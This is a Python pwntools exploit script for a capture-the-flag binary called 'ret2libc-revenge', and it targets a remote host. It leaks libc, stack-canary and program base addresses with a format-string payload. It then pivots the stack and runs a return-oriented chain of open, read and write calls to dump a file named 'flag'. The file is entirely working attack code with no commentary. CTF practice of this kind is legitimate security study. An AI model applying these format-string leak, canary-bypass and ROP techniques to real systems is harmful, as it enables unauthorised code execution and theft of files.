from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("../dist/ret2libc-revenge")
s=remote("8.130.35.16",53004)
elf=ELF("../dist/ret2libc-revenge")
libc=ELF("../dist/libc.so.6")
s.sendafter(b"name:\n",b"%8$p.%13$p.%9$p.")
libc.address=eval(s.recvuntil(b".")[:-1])-(0x7ffff7fc72e8-0x7ffff7dd6000)
canary=eval(s.recvuntil(b".")[:-1])
elf.address=eval(s.recvuntil(b".")[:-1])-0x14c0
success(hex(libc.address))
success(hex(elf.address))
success(hex(canary))
pause()

leave_ret=libc.address+0x00000000000578c8
pivot_read=0x148D

s.sendafter(b"intro:\n",flat([
    b"a"*0x38,canary,
    elf.address+0x4400+0x40,
    elf.address+pivot_read,
]))

rdi=0x0000000000023b6a+libc.address
rsi=0x000000000002601f+libc.address
rdx=0x0000000000142c92+libc.address
rax=0x0000000000036174+libc.address
ret=rdi+1
syscall_ret=0x00000000000630a9+libc.address
s.send(flat([
    elf.address+0x4400+0x40,rdx,
    0x1000,libc.sym.read,
    rdi+1,rdi+1,
    rdi+1,canary,
    elf.address+0x4400,leave_ret,
]))
s.send(flat([
    ret,ret,ret,ret,
    rdi,elf.address+0x4400+0x200,
    rsi,0,rdx,0,
    libc.sym.open,
    rdi,3,rsi,elf.address+0x4400+0x200,rdx,0x100,
    libc.sym.read,
    rdi,1,
    libc.sym.write,
    rdi,elf.address+0x4400+0x200,
    elf.plt.puts,
]).ljust(0x200,b"\x00")+b"flag\x00")
s.interactive()
